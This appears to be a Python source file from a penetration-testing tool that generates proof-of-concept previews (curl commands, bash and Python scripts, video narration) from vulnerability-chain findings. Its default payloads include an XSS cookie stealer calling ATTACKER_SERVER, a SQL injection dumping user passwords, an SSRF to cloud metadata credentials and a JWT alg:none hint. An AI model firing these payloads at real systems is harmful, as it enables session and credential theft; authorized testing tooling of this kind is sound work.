def _url_with_parameter(url, parameter, value):
    parsed = urlsplit(str(url))
    query = parse_qsl(parsed.query, keep_blank_values=True)
    query.append((str(parameter), str(value)))
    return urlunsplit(parsed._replace(query=urlencode(query)))


def _curl(url, method="GET", data=None, headers=(), flags=()):
    """Build a POSIX-shell-safe curl command with certificate checks enabled."""
    parts = ["curl", "-s", *flags]
    method = str(method).upper()
    if method != "GET":
        parts.extend(["-X", shlex.quote(method)])
    for header in headers:
        parts.extend(["-H", shlex.quote(str(header))])
    if data is not None:
        parts.extend(["-d", shlex.quote(str(data))])
    parts.extend(["--", shlex.quote(str(url))])
    return " ".join(parts)


def generate_curl_command(step, finding):
    """Generate a shell-safe curl command from finding data."""
    url = finding.get("url", step.get("target", "https://TARGET"))
    method = finding.get("method", "GET")
    payload = finding.get("payload", "")
    parameter = finding.get("parameter", "")
    vuln_type = str(finding.get("type", "")).lower()

    if "jwt" in vuln_type:
        return (
            "# Decode JWT:\n"
            "echo 'YOUR_JWT_TOKEN' | cut -d'.' -f2 | base64 -d 2>/dev/null\n"
            "# Modify claims and re-sign (or use alg:none)"
        )
    if "takeover" in vuln_type:
        domain = shlex.quote(str(finding.get("domain", "TARGET")))
        return f"# Verify dangling CNAME:\ndig {domain} CNAME\n# Check if target service is claimable"
    if "bucket" in vuln_type:
        return f"{_curl(url)} | head -50\n# Or: aws s3 ls s3://BUCKET_NAME --no-sign-request"
    if "idor" in vuln_type or "bola" in vuln_type:
        return "# Authenticate first, then:\n" + _curl(
            url, headers=("Cookie: session=YOUR_SESSION",)
        ) + "\n# Change the ID parameter only within authorized scope."
    if "redirect" in vuln_type:
        target = _url_with_parameter(url, "redirect", "https://ATTACKER_SERVER/capture")
        return _curl(target, flags=("-L",))

    if "sqli" in vuln_type:
        value = payload or "' UNION SELECT username,password FROM users--"
    elif "xss" in vuln_type:
        value = payload or "<script>document.location='https://ATTACKER_SERVER/steal?c='+document.cookie</script>"
    elif "ssrf" in vuln_type:
        value = payload or "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    elif "ssti" in vuln_type:
        value = payload or "{{7*7}}"
    else:
        value = payload or "test"

    if str(method).upper() == "GET":
        return _curl(_url_with_parameter(url, parameter, value))
    return _curl(url, method, urlencode({str(parameter): str(value)}))

def generate_python_poc(chain):
    """Generate a non-networking preview; the guarded executor owns requests."""
    plan = chain.get("execution_plan")
    lines = [
        "#!/usr/bin/env python3",
        "\"\"\"Generated chain preview. This file does not send network requests.\"\"\"",
        "import json",
        "",
        f"CHAIN_NAME = {str(chain.get('name', 'Unknown Chain'))!r}",
        f"EXECUTION_PLAN = {plan!r}",
        f"STEPS = {chain.get('steps', [])!r}",
        "",
        "def main():",
        "    print(f'Chain preview: {CHAIN_NAME}')",
        "    for index, step in enumerate(STEPS, 1):",
        "        print(f'{index}. {step}')",
        "    if EXECUTION_PLAN:",
        "        print('A guarded execution plan is available; review its scope before use.')",
        "        print(json.dumps(EXECUTION_PLAN, indent=2))",
        "        print('Execute only through execute_chain.py with explicit allowlists.')",
        "    else:",
        "        print('No supported executable plan. This chain remains a manual analysis.')",
        "",
        "if __name__ == '__main__':",
        "    main()",
        "",
    ]
    return "\n".join(lines)
def generate_curl_sequence(chain):
    """Generate a shell-safe preview with network commands commented out."""
    chain_name = str(chain.get("name", "Unknown Chain"))
    safe_comment = " ".join(chain_name.splitlines())
    lines = [
        "#!/bin/bash",
        "# PoC: " + safe_comment,
        "# Generated by vuln-chain-composer (orizon.one)",
        "# AUTHORIZED TESTING ONLY",
        "set -e",
        "echo " + shlex.quote("=== Chain PoC: " + chain_name + " ==="),
        "echo ''",
    ]

    original = chain.get("original_correlation", {})
    if not isinstance(original, dict):
        original = {}
    primary = chain.get("primary_finding", original.get("primary_finding", {}))
    supporting = chain.get("supporting_findings", original.get("supporting_findings", []))
    if not isinstance(primary, dict):
        primary = {}
    if not isinstance(supporting, list):
        supporting = []
    all_findings = [primary] + supporting
    steps = chain.get("steps", [])
    phases = chain.get("phases", [])

    if isinstance(phases, list) and phases:
        for phase in phases:
            if not isinstance(phase, dict):
                continue
            phase_name = str(phase.get("phase", "Step"))
            lines.append("echo " + shlex.quote("--- " + phase_name + " ---"))
            finding = {
                "url": phase.get("target", ""),
                "type": phase.get("technique", ""),
                "method": "GET",
            }
            finding_id = phase.get("finding_id", "")
            for candidate in all_findings:
                if isinstance(candidate, dict) and candidate.get("id", "") == finding_id:
                    finding = candidate
                    break
            detailed_steps = phase.get("detailed_steps", [])
            if isinstance(detailed_steps, list):
                for index, step in enumerate(detailed_steps, 1):
                    label = str(step.get("step", index)) if isinstance(step, dict) else str(index)
                    action = str(step.get("action", "")) if isinstance(step, dict) else str(step)
                    lines.append("echo " + shlex.quote(f"Step {label}: {action}"))
            lines.extend("# " + line for line in generate_curl_command(phase, finding).splitlines())
            lines.extend(["echo ''", ""])
    elif isinstance(steps, list):
        for index, step_text in enumerate(steps):
            lines.append("echo " + shlex.quote(f"Step {index + 1}: {step_text}"))
            finding = all_findings[min(index, len(all_findings) - 1)] if all_findings else {}
            if isinstance(finding, dict):
                lines.extend("# " + line for line in generate_curl_command(
                    {"target": finding.get("url", "")}, finding
                ).splitlines())
            lines.extend(["echo ''", ""])

    lines.append("echo " + shlex.quote("=== Chain PoC Complete ==="))
    lines.append("")
    return "\n".join(lines)

def generate_video_script(chain):
    """Generate a narrated video script for PoC recording."""
    lines = []
    chain_name = chain.get("name", "Unknown Chain")
    severity = chain.get("chain_severity", chain.get("overall_severity", "HIGH"))
    description = chain.get("description", "")

    lines.append(f"VIDEO PoC SCRIPT: {chain_name}")
    lines.append(f"{'=' * 60}")
    lines.append("")
    lines.append(f"INTRO (5 seconds):")
    lines.append(f'  Show: Title card with "{chain_name}"')
    lines.append(f"  Narrate: \"This proof of concept demonstrates a {severity}-severity")
    lines.append(f'  vulnerability chain. {description}\"')
    lines.append("")

    phases = chain.get("phases", [])
    steps = chain.get("steps", [])

    if phases:
        for i, phase in enumerate(phases):
            lines.append(f"SCENE {i+1}: {phase.get('phase', 'Step')} ({phase.get('technique', '')})")
            lines.append(f"  Target: {phase.get('target', '')}")
            for step in phase.get("detailed_steps", []):
                lines.append(f"  Action: {step.get('action', '')}")
                lines.append(f"  Show: Response/evidence on screen")
            lines.append(f"  Narrate: Explain what was achieved and how it enables the next step")
            lines.append("")
    else:
        for i, step_text in enumerate(steps):
            lines.append(f"SCENE {i+1}:")
            lines.append(f"  Action: {step_text}")
            lines.append(f"  Show: Browser/terminal with exploitation")
            lines.append(f"  Narrate: Explain the step and its significance")
            lines.append("")

    lines.append(f"OUTRO (10 seconds):")
    lines.append(f'  Show: Summary of impact')
    lines.append(f'  Narrate: "This chain demonstrates {severity} impact through')
    lines.append(f'  combining multiple vulnerabilities. Remediation recommendations')
    lines.append(f'  are included in the written report."')
    lines.append("")

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description="Chain PoC Generator - orizon.one")
    parser.add_argument("--input", "-i", required=True, help="Chains JSON file (output of build_chains.py or calculate_impact.py)")
    parser.add_argument("--output", "-o", help="Output JSON file")
    parser.add_argument("--output-dir", "-d", help="Directory to write individual PoC scripts")
    args = parser.parse_args()

    log("Generating chain PoC scripts...")

    with open(args.input) as f:
        data = json.load(f)

    chains = data.get("chains", [])
    log(f"Loaded {len(chains)} chains for PoC generation")

    if not chains:
        warn("No chains found in input.")
        return

    poc_results = []
    output_dir = None
    if args.output_dir:
        output_dir = Path(args.output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

    for i, chain in enumerate(chains):
        chain_name = chain.get("name", f"chain_{i+1}")
        safe_name = chain_name.lower().replace(" ", "_").replace("+", "and").replace("=", "eq")[:50]

        # Generate all PoC types
        python_poc = generate_python_poc(chain)
        curl_poc = generate_curl_sequence(chain)
        video_script = generate_video_script(chain)

        poc_entry = {
            "chain_name": chain_name,
            "chain_severity": chain.get("chain_severity", chain.get("overall_severity", "HIGH")),
            "execution_plan": chain.get("execution_plan"),
            "python_poc": python_poc,
            "curl_poc": curl_poc,
            "video_script": video_script,
        }
        poc_results.append(poc_entry)

        # Write individual files if output dir specified
        if output_dir:
            py_path = output_dir / f"poc_{safe_name}.py"
            with open(py_path, "w") as f:
                f.write(python_poc)
            success(f"Written: {py_path}")

            sh_path = output_dir / f"poc_{safe_name}.sh"
            with open(sh_path, "w") as f:
                f.write(curl_poc)
            success(f"Written: {sh_path}")

            txt_path = output_dir / f"video_script_{safe_name}.txt"
            with open(txt_path, "w") as f:
                f.write(video_script)
            success(f"Written: {txt_path}")

            if chain.get("execution_plan"):
                plan_path = output_dir / f"execution_plan_{safe_name}.json"
                with open(plan_path, "w", encoding="utf-8") as f:
                    json.dump(chain["execution_plan"], f, indent=2)
                    f.write("\n")
                success(f"Written: {plan_path}")

        success(f"Generated PoC for: {chain_name}")

    output = {
        "meta": {
            "timestamp": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z'),
            "type": "chain_poc",
            "tool": "vuln-chain-composer by orizon.one",
            "chains_processed": len(poc_results),
        },
        "pocs": poc_results,
    }

    output_path = args.output or "chain_pocs.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  PoC GENERATION SUMMARY")
    print(f"{'='*60}")
    print(f"  Chains processed  : {len(poc_results)}")
    print(f"  PoC types per chain: Python script, curl sequence, video script")
    if output_dir:
        print(f"  Output directory  : {output_dir}")
    print(f"\n  Generated PoCs:")
    for i, poc in enumerate(poc_results):
        print(f"    {i+1}. {poc['chain_name']} [{poc['chain_severity']}]")
        print(f"       Python: {len(poc['python_poc'].splitlines())} lines")
        print(f"       Curl:   {len(poc['curl_poc'].splitlines())} lines")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
